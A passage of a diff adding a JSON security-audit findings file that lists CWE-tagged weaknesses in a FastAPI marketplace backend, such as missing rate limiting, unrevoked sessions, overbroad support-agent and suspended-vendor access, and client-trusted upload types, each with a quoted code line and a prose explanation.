+          "proof": "SOURCE: untrusted HTTP request to /api/auth/login. SINK: the login handler at line 102 performs password verification with no throttling, lockout, or CAPTCHA. An attacker can send unlimited login attempts with different passwords, enabling automated credential stuffing and brute-force attacks against any user account."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 49
+      },
+      "end": {
+        "line": 49
+      },
+      "extra": {
+        "message": "Missing Rate Limiting on Registration Endpoint Enables Account Flooding",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "def register(\n    payload: RegisterIn,\n    request: Request,\n    response: Response,\n    db: Session = Depends(get_db),",
+          "proof": "SOURCE: untrusted HTTP request to /api/auth/register. SINK: the register handler at line 49 creates user accounts with no throttling. An attacker can automate mass account creation to exhaust database resources, fill storage, or create sybil accounts for abuse."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 168
+      },
+      "end": {
+        "line": 168
+      },
+      "extra": {
+        "message": "Missing Rate Limiting on Password Reset Request Enables Enumeration and Email Flooding",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "def password_reset_request(payload: PasswordResetRequestIn, request: Request, db: Session = Depends(get_db)):",
+          "proof": "SOURCE: untrusted HTTP request to /api/auth/password-reset/request. SINK: the handler at line 168 generates password reset tokens with no rate limiting. An attacker can: (1) enumerate valid accounts by measuring response timing differences (account exists vs. not), and (2) flood users with password reset emails, causing user confusion and support burden."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 199
+      },
+      "end": {
+        "line": 199
+      },
+      "extra": {
+        "message": "Missing Rate Limiting on Password Reset Confirmation Enables Token Brute-Force",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "def password_reset_confirm(payload: PasswordResetConfirmIn, request: Request, db: Session = Depends(get_db)):",
+          "proof": "SOURCE: untrusted HTTP request to /api/auth/password-reset/confirm carrying an attacker-chosen token value. SINK: the handler at line 199 looks up the provided token hash and resets the password on match. Without rate limiting, an attacker can rapidly try different reset tokens to hijack accounts. The dev endpoint leaks the raw token in development mode, and no throttling allows immediate exploitation of a leaked token."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 129
+      },
+      "end": {
+        "line": 129
+      },
+      "extra": {
+        "message": "Logout Does Not Invalidate Server-Side JWT Session Token",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "def logout(request: Request, response: Response, db: Session = Depends(get_db)):\n    response.delete_cookie(\"session\", path=\"/\")",
+          "proof": "SOURCE: user-initiated logout. SINK: the logout handler at line 129 only deletes the session cookie from the response but does not invalidate the JWT token server-side (no blocklist, no rotation). The JWT remains valid until its 12-hour expiry. An attacker who has intercepted or stolen the session cookie can continue using the stolen JWT token even after the legitimate user logs out."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 148
+      },
+      "end": {
+        "line": 148
+      },
+      "extra": {
+        "message": "Session Token Not Rotated After Password Change",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "current_user.password_hash = hash_password(payload.new_password)\n        audit.record(\n            db,\n            actor=current_user,\n            action=\"user.password_change\",",
+          "proof": "SOURCE: user-submitted new password via PUT /api/auth/me. SINK: the password hash is updated but the session token created by _set_session_cookie is never rotated. The old JWT session token remains valid with the old claims. An attacker who has compromised an active session can continue using it even after the victim changes their password."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "backend/app/routers/orders.py",
+      "start": {
+        "line": 167
+      },
+      "end": {
+        "line": 167
+      },
+      "extra": {
+        "message": "Support Agents Granted Unrestricted Read Access to All Orders, Exposing Buyer/Vendor PII",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "elif current_user.role in (UserRole.marketplace_admin, UserRole.support_agent):\n        query = db.query(Order)",
+          "proof": "SOURCE: an authenticated support_agent user sending GET /api/orders/mine. SINK: lines 166-167 give support_agent the same unfiltered 'db.query(Order)' access as marketplace_admin, returning ALL orders in the system including shipping addresses, buyer names, product details, and pricing. Support agents only need to see orders involved in disputes assigned to them."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "backend/app/routers/orders.py",
+      "start": {
+        "line": 35
+      },
+      "end": {
+        "line": 35
+      },
+      "extra": {
+        "message": "Support Agents Can View Arbitrary Order Details Via Direct ID Access Without Scope Limit",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "if user.role == UserRole.support_agent:\n        return",
+          "proof": "SOURCE: an authenticated support_agent user sending GET /api/orders/{order_id} with any valid order_id. SINK: in _authorize_order_view, support_agent bypasses all ownership or dispute-relationship checks and can view ANY order's full details (shipping address, items, pricing, buyer/vendor IDs). Combined with the unfiltered listing, a support agent can enumerate and access all orders' PII without a business need."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-16",
+      "path": "backend/app/config.py",
+      "start": {
+        "line": 16
+      },
+      "end": {
+        "line": 16
+      },
+      "extra": {
+        "message": "Default environment is 'development' which disables multiple security controls",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-16"
+          ],
+          "citation": "environment: str = \"development\"",
+          "proof": "The default environment string is 'development' (line 16). This value controls: (1) auth.py:35 \u2014 secure = _settings.environment != \"development\" disables the Secure flag on session cookies; (2) auth.py:196 \u2014 if _settings.environment == \"development\" returns the raw password-reset token in the HTTP response body. Deploying to production without overriding ENVIRONMENT via the .env file silently disables these protections."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-614",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 35
+      },
+      "end": {
+        "line": 35
+      },
+      "extra": {
+        "message": "Session cookie set without Secure flag under default 'development' environment",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-614"
+          ],
+          "citation": "secure = _settings.environment != \"development\"",
+          "proof": "The _set_session_cookie helper (line 33-45) uses secure = _settings.environment != \"development\" to gate the cookie's Secure attribute. Since the default environment IS 'development' (config.py:16), the session cookie is transmitted over unencrypted HTTP connections in a default deployment, allowing network eavesdroppers to steal session tokens."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-693",
+      "path": "backend/app/main.py",
+      "start": {
+        "line": 49
+      },
+      "end": {
+        "line": 49
+      },
+      "extra": {
+        "message": "Missing Strict-Transport-Security (HSTS) header in secure_headers middleware",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-693"
+          ],
+          "citation": "response.headers[\"Referrer-Policy\"] = \"no-referrer\"\n    response.headers[\"X-Frame-Options\"] = \"DENY\"",
+          "proof": "The secure_headers middleware (main.py:46-52) sets X-Content-Type-Options, Referrer-Policy, and X-Frame-Options but does NOT set Strict-Transport-Security. Without HSTS, clients can be downgraded to plaintext HTTP via MITM attacks, exposing session cookies."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-384",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 156
+      },
+      "end": {
+        "line": 156
+      },
+      "extra": {
+        "message": "Password change does not invalidate existing JWT session tokens",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-384"
+          ],
+          "citation": "current_user.password_hash = hash_password(payload.new_password)",
+          "proof": "The update_profile endpoint (auth.py:142-169) allows a user to change their password (line 156), but does NOT invalidate any existing session tokens for that user. Since JWT sessions are stateless and verified only by signature (security.py:46), all previously-issued tokens remain valid until their natural expiration. An attacker with a stolen session token retains access even after the legitimate user changes their password."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-640",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 221
+      },
+      "end": {
+        "line": 221
+      },
+      "extra": {
+        "message": "Password reset does not invalidate other pending reset tokens for the same user",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-640"
+          ],
+          "citation": "user.password_hash = hash_password(payload.new_password)\n    record.used_at = now",
+          "proof": "In password_reset_confirm (auth.py:199-228), after validating the token, the code sets user.password_hash and marks only the specific record.used_at = now. It queries only the single token matching the provided hash. Any OTHER pending PasswordResetToken rows for the same user_id that have not expired remain valid. An attacker who obtains a different reset token for the same user can still use it after the password has already been changed."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "backend/app/routers/vendors.py",
+      "start": {
+        "line": 93
+      },
+      "end": {
+        "line": 93
+      },
+      "extra": {
+        "message": "Vendor contact PII exposed on unauthenticated public endpoints",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "@router.get(\"\", response_model=list[VendorOut])",
+          "proof": "GET /api/vendors and GET /api/vendors/{vendor_id} require no authentication and return VendorOut (backend/app/schemas.py lines 86-87), which includes contact_email and contact_phone. Any unauthenticated visitor can enumerate active vendors and harvest their email addresses and phone numbers."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-208",
+      "path": "backend/app/deps.py",
+      "start": {
+        "line": 51
+      },
+      "end": {
+        "line": 51
+      },
+      "extra": {
+        "message": "Non-constant-time API-key hash comparison",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-208"
+          ],
+          "citation": "if not record or record.key_hash != key_hash:",
+          "proof": "API key authentication hashes the supplied key with hash_token and compares it to the stored key_hash using Python's '!=' operator. A network-close attacker can measure byte-by-byte timing differences to recover the valid HMAC hash, even though a constant_time_eq helper already exists in backend/app/security.py."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-770",
+      "path": "backend/app/routers/imports_exports.py",
+      "start": {
+        "line": 35
+      },
+      "end": {
+        "line": 35
+      },
+      "extra": {
+        "message": "Missing rate limiting on bulk product import endpoint",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-770"
+          ],
+          "citation": "@router.post(\"/imports/products\")",
+          "proof": "Authenticated vendors can POST CSV imports repeatedly with no per-user, per-IP, or global throttling. Each request can create up to 2000 products, enabling inventory/catalog spam or database bloat with no brute-force protection on this sensitive write endpoint."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "backend/app/routers/disputes.py",
+      "start": {
+        "line": 34
+      },
+      "end": {
+        "line": 34
+      },
+      "extra": {
+        "message": "Support Agents Granted Unrestricted Read Access to All Disputes",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "if user.role in (UserRole.marketplace_admin, UserRole.support_agent):\n        return True",
+          "proof": "The `_can_view` function at line 34 returns True for all support_agents without checking `assigned_agent_id`, despite the Dispute model (line 147 of models.py) defining that field to scope disputes to specific agents. Any support agent can read any dispute's details, messages (including internal ones), and evidence via GET /{dispute_id}, GET /{dispute_id}/messages, and GET /{dispute_id}/evidence. The `my_disputes` endpoint (line 84-85) also returns ALL disputes for support_agents without any assignment filter. SOURCE: attacker-controlled `dispute_id` path parameter. SINK: `_can_view` returns True unconditionally for support_agents."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "backend/app/routers/disputes.py",
+      "start": {
+        "line": 128
+      },
+      "end": {
+        "line": 128
+      },
+      "extra": {
+        "message": "Support Agents Can Modify Any Dispute Without Assignment Scope Check",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "@router.put(\"/{dispute_id}\", response_model=DisputeOut)\ndef update_dispute(\n    dispute_id: int,\n    payload: DisputeUpdateIn,\n    request: Request,\n    db: Session = Depends(get_db),\n    current_user: User = Depends(require_support),",
+          "proof": "The `update_dispute` route at line 128 uses `require_support` (deps.py line 55: allows support_agent and marketplace_admin) but never checks whether the dispute is assigned to the current agent via `assigned_agent_id`. Any support agent can change status, set resolution (line 139-140), reassign the dispute to any agent (line 142-146), and \u2014 when status is set to `resolved` \u2014 automatically change the underlying order status to `fulfilled` (line 136). SOURCE: attacker-controlled `dispute_id` path parameter. SINK: no assignment-scope check before mutation."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "backend/app/routers/disputes.py",
+      "start": {
+        "line": 107
+      },
+      "end": {
+        "line": 107
+      },
+      "extra": {
+        "message": "Support Agents Can Post Internal Messages on Any Dispute",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "def post_message(\n    dispute_id: int,\n    payload: DisputeMessageIn,\n    ...\n    current_user: User = Depends(get_current_user),\n):\n    dispute = db.get(Dispute, dispute_id)\n    if not dispute:\n        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail=\"Dispute not found\")\n    _require_view(current_user, dispute)",
+          "proof": "The `post_message` route at line 107 calls `_require_view` which delegates to `_can_view` (line 34) allowing support_agents unconditionally. Since `_can_see_internal` (line 46) also returns True for support_agents, a support agent can post `is_internal=True` messages on ANY dispute, not just ones assigned to them. Internal messages are visible only to staff but influence the dispute record and are recorded in audit logs. SOURCE: attacker-controlled `dispute_id` path parameter. SINK: `_require_view` permits access without any assignment filter."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "backend/app/routers/orders.py",
+      "start": {
+        "line": 107
+      },
+      "end": {
+        "line": 107
+      },
+      "extra": {
+        "message": "Suspended Vendor Can Update Order Status (Accept/Fulfill/Cancel)",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "@router.put(\"/{order_id}/status\", response_model=OrderOut)\ndef update_order_status(\n    order_id: int,\n    payload: OrderStatusUpdateIn,\n    ...\n    current_user: User = Depends(require_vendor),",
+          "proof": "`require_vendor` (deps.py line 49) only checks `current_user.role != UserRole.vendor_manager` \u2014 it does NOT check `vendor.status`. An admin can suspend a vendor via `vendors.py:admin_update_vendor` (line 103), but the vendor_manager retains their role and `current_user.vendor` relationship remains intact. The ownership check at line 116 (`order.vendor_id != current_user.vendor.id`) also only checks `vendor_id`, not vendor status. SOURCE: admin suspension is bypassable because the user's role and vendor_id stay unchanged. SINK: the route accepts order status transitions (placed\u2192accepted, accepted\u2192fulfilled, etc.) even when vendor is suspended. Compare with `products.py:create_product` (line 77) which explicitly checks vendor status."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "backend/app/routers/products.py",
+      "start": {
+        "line": 119
+      },
+      "end": {
+        "line": 119
+      },
+      "extra": {
+        "message": "Suspended Vendor Can Edit Product Details",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "@router.put(\"/mine/{product_id}\", response_model=ProductOut)\ndef update_my_product(\n    product_id: int,\n    payload: ProductIn,\n    ...\n    current_user: User = Depends(require_vendor),",
+          "proof": "The `update_my_product` route at line 119 enforces role (`require_vendor`) and ownership (`_require_vendor_owns_product` at line 122) but NOT vendor status. Compare with `create_product` (line 77) which checks `current_user.vendor.status not in (VendorStatus.active, VendorStatus.pending_verification)`. A vendor whose status is `suspended` or `rejected` can still update SKU, title, description, price, inventory, and category of their products at lines 128-134. SOURCE: the attacker is a vendor_manager whose vendor was suspended by admin. SINK: lines 128-134 directly overwrite Product fields without any vendor-status gate."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "backend/app/routers/products.py",
+      "start": {
+        "line": 148
+      },
+      "end": {
+        "line": 148
+      },
+      "extra": {
+        "message": "Suspended Vendor Can Submit Products for Review",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "@router.post(\"/mine/{product_id}/submit\", response_model=ProductOut)\ndef submit_for_review(\n    product_id: int,\n    ...\n    current_user: User = Depends(require_vendor),",
+          "proof": "Same pattern as finding above. `submit_for_review` at line 148 uses `_require_vendor_owns_product` (line 150) which checks only ownership, not vendor status. A suspended vendor can transition product status from `draft` or `rejected` to `pending_review`, submitting products for admin moderation despite being suspended. Compare with `create_product` (line 77) which blocks suspended vendors. SOURCE: vendor_manager whose vendor is suspended. SINK: product.status is set to `pending_review` at line 155 without any vendor-status check."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "backend/app/routers/products.py",
+      "start": {
+        "line": 173
+      },
+      "end": {
+        "line": 173
+      },
+      "extra": {
+        "message": "Suspended Vendor Can Archive Products",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "@router.post(\"/mine/{product_id}/archive\", response_model=ProductOut)\ndef archive_product(\n    product_id: int,\n    ...\n    current_user: User = Depends(require_vendor),",
+          "proof": "Same pattern. `archive_product` at line 173 uses `_require_vendor_owns_product` (line 175) which checks only ownership, not vendor status. A suspended vendor can archive their products, potentially removing evidence of policy violations that administrators were reviewing. Compare with `create_product` (line 77) which blocks suspended vendors. SOURCE: vendor_manager whose vendor is suspended. SINK: product.status is set to `archived` at line 179 without any vendor-status check."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "backend/app/routers/webhooks.py",
+      "start": {
+        "line": 22
+      },
+      "end": {
+        "line": 22
+      },
+      "extra": {
+        "message": "Suspended Vendor Can Create Webhooks That Fire on Order Events",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "@router.post(\"/mine\", response_model=WebhookOut, status_code=status.HTTP_201_CREATED)\ndef create_webhook(\n    payload: WebhookIn,\n    ...\n    current_user: User = Depends(require_vendor),",
+          "proof": "`create_webhook` at line 22 uses `require_vendor` (role check only) and never checks `vendor.status`. A suspended vendor can register a webhook with an attacker-controlled `target_url`. Since `_enqueue_webhook_delivery` in orders.py (line 58) fires webhooks for ALL active vendor webhooks regardless of vendor status, suspended vendors can continue receiving order event data (order_id, status, vendor_id) at their external endpoint. SOURCE: `require_vendor` permits any vendor_manager role. SINK: webhook creation at line 40 proceeds without vendor-status validation."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "backend/app/routers/webhooks.py",
+      "start": {
+        "line": 45
+      },
+      "end": {
+        "line": 45
+      },
+      "extra": {
+        "message": "Suspended Vendor Can Delete Webhooks",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "@router.delete(\"/mine/{webhook_id}\")\ndef delete_webhook(\n    webhook_id: int,\n    ...\n    current_user: User = Depends(require_vendor),",
+          "proof": "`delete_webhook` at line 45 uses `require_vendor` (role check only) and checks vendor_id ownership (line 49) but not vendor status. A suspended vendor can delete webhook records, potentially destroying evidence of webhook activity that administrators would use in investigations. SOURCE: vendor_manager whose vendor is suspended. SINK: `db.delete(hook)` at line 52 proceeds without any vendor-status check."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-434",
+      "path": "backend/app/storage.py",
+      "start": {
+        "line": 48
+      },
+      "end": {
+        "line": 48
+      },
+      "extra": {
+        "message": "File Upload Validates Client-Supplied Content-Type Instead of Actual File Content (MIME Spoofing)",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-434"
+          ],
+          "citation": "allowed = ALLOWED_TYPES[category]\n    if file.content_type not in allowed:\n        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=f\"Unsupported content type: {file.content_type}\")\n    ext = EXT_BY_CONTENT_TYPE.get(file.content_type or '', \"\")",
+          "proof": "The `save_upload` function in storage.py validates `file.content_type` which is the HTTP `Content-Type` header supplied by the client. No magic-byte inspection (e.g., python-magic) is performed. An attacker can upload a file containing arbitrary content (JavaScript payload, PHP shell, polyglot image+script) by simply setting `Content-Type: image/jpeg` in the multipart POST request. The file extension (`.jpg`) is derived from this header at line 52, so the stored file will have a benign extension but malicious content. SOURCE: `file: UploadFile = File(...)` from any upload route (product images at products.py:200, dispute evidence at disputes.py:161, CSV imports at imports_exports.py:36). SINK: `file.content_type` is read at line 48 without server-side content verification."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-770",
+      "path": "backend/app/routers/imports_exports.py",
+      "start": {
+        "line": 178
+      },
+      "end": {
+        "line": 178
+      },
+      "extra": {
+        "message": "Vendor Inventory Export Has No Row Limit Causing Unbounded Memory Allocation",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-770"
+          ],
+          "citation": "rows = [\n            [p.id, p.sku, p.title, p.status.value, p.price_cents, p.inventory]\n            for p in db.query(Product).filter(Product.vendor_id == current_user.vendor.id).order_by(Product.id).all()\n        ]",
+          "proof": "The `export_my_inventory` route at line 180 uses `.all()` without any `.limit()` clause, pulling every product for the vendor into memory and building a Python list. All other export endpoints (`export_orders` at line 121, `export_payouts` at line 140, `export_disputes` at line 155, `export_inventory` at line 169) use `.limit(5000)`. A vendor with a sufficiently large product catalog (or an attacker who bulk-creates products via the import endpoint \u2014 up to 2000 per import, repeatable) can cause the server to allocate memory proportional to catalog size. The full CSV buffer is also built in memory at `_csv_response` (line 89) via `io.StringIO`. SOURCE: the vendor can bulk-create products via `import_products` (imports_exports.py line 24, 2000-per-import limit, repeatable). SINK: `.all()` at line 183 with no row cap."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "backend/app/routers/admin_users.py",
+      "start": {
+        "line": 36
+      },
+      "end": {
+        "line": 36
+      },
+      "extra": {
+        "message": "Admin Disabling a User Does Not Revoke Existing API Keys or Session Tokens",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "if payload.is_active is not None and payload.is_active != user.is_active:\n        details[\"active_change\"] = {\"from\": user.is_active, \"to\": payload.is_active}\n        user.is_active = payload.is_active",
+          "proof": "When a marketplace_admin sets `is_active=False` on a user via `admin_users.py:update_user`, the route only toggles `User.is_active`. It does NOT: (1) revoke any of the user's API keys (ApiKey records remain with `is_active=True`), (2) invalidate existing JWT session tokens (they remain cryptographically valid and the server has no blocklist), or (3) expire pending password reset tokens. While `get_current_user` checks `user.is_active` at the DB level (so subsequent requests fail during suspension), the stale JWT tokens and API keys remain valid: if the user is later re-enabled, all previously issued tokens and keys become immediately usable again without any administrative action. Additionally, the JWT tokens have no `jti` claim or server-side revocation mechanism. SOURCE: admin sets `is_active=False`. SINK: no cascade to ApiKey.is_active or token blocklist."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-434",
+      "path": "backend/app/storage.py",
+      "start": {
+        "line": 65
+      },
+      "end": {
+        "line": 65
+      },
+      "extra": {
+        "message": "File upload trusts client-supplied Content-Type without magic-byte verification",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-434"
+          ],
+          "citation": "if file.content_type not in allowed:",
+          "proof": "The save_upload function receives file.content_type directly from the HTTP multipart request header. This is the sole validation gate at line 65 \u2014 no magic-byte inspection or content verification follows. The file extension is also derived from this same content_type via EXT_BY_CONTENT_TYPE. An attacker sets Content-Type to 'image/png' while uploading a malicious executable, script, or HTML payload. The file is persisted to disk with the spoofed extension and retrievable, enabling arbitrary file upload that can lead to remote code execution if served or executed."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-841",
+      "path": "backend/app/routers/disputes.py",
+      "start": {
+        "line": 256
+      },
+      "end": {
+        "line": 256
+      },
+      "extra": {
+        "message": "Dispute status transitions lack state machine validation",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-841"
+          ],
+          "citation": "dispute.status = payload.status",
+          "proof": "The PUT /api/disputes/{dispute_id} endpoint requires require_support and directly assigns payload.status to dispute.status at line 256 without any transition validation. Contrast with orders.py lines 191-210 which enforce _VENDOR_TRANSITIONS restricting allowed state changes (e.g., placed->accepted/cancelled). A support agent can set a dispute to any status arbitrarily \u2014 jumping from 'open' directly to 'resolved' without buyer/vendor input, or reopening a 'closed' dispute \u2014 bypassing the intended workflow stages and undesirably forcing order state changes (disputed->fulfilled on resolve)."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-204",
+      "path": "backend/app/routers/auth.py",
+      "start": {
+        "line": 110
+      },
+      "end": {
+        "line": 110
+      },
+      "extra": {
+        "message": "Login endpoint differentiates disabled accounts from non-existent/wrong-password",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-204"
+          ],
+          "citation": "if not user.is_active:\n        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail=\"Account disabled\")",
+          "proof": "The login function first checks credentials \u2014 if user doesn't exist or password is wrong, it returns 401 'Invalid email or password' (line 107-109). Only after successful password verification does it check account status, returning 403 'Account disabled' (line 110-111). An attacker providing a known-valid password for a disabled account receives a 403 instead of a 401, confirming both the email's existence and the password's correctness, enabling enumeration of valid credentials on disabled accounts."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "backend/app/routers/api_keys.py",
+      "start": {
+        "line": 33
+      },
+      "end": {
+        "line": 33
+      },
+      "extra": {
+        "message": "API keys never expire \u2014 no TTL or maximum lifetime",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "is_active=True,",
+          "proof": "The ApiKey model has no expires_at column. create_key at line 28-34 sets only is_active=True with no TTL or maximum lifetime configuration. Leaked or long-forgotten API keys remain valid indefinitely (line 33 represents the creation pattern). The only revocation mechanism is manual via the DELETE /api/api-keys/{key_id} endpoint (line 44-52). There is no background job, expiry check middleware, or time-based deactivation, violating the principle of limited credential lifetime."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/routers/disputes.py",
+      "start": {
+        "line": 134
+      },
+      "end": {
+        "line": 134
+      },
+      "extra": {
+        "message": "Unbounded dispute message list can exhaust server memory",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": ".all()",
+          "proof": "list_messages at line 130-134 executes .all() on the DisputeMessage query for the supplied dispute_id with no LIMIT, offset, or pagination. An attacker or a dispute participant could generate a very large number of messages. The server loads and serializes every DisputeMessage record into memory at once, then inefficiently filters internal messages in Python, leading to unbounded memory consumption and potential denial of service."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "backend/app/routers/disputes.py",
+      "start": {
+        "line": 238
+      },
+      "end": {
+        "line": 238
+      },
+      "extra": {
+        "message": "Unbounded dispute evidence list can exhaust server memory",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "rows = db.query(DisputeEvidence).filter(DisputeEvidence.dispute_id == dispute.id).order_by(DisputeEvidence.created_at.asc()).all()",
+          "proof": "list_evidence at line 238 executes .all() on the DisputeEvidence query with no LIMIT, offset, or pagination. A dispute with many uploaded evidence files (e.g., large images or PDFs referenced from the records) causes the server to load every record into memory. Combined with the serialization overhead of FileRecord metadata via DisputeEvidenceOut.model_validate(), this can exhaust server memory and cause denial of service."
+        }
+      }
+    }
+  ]
+}
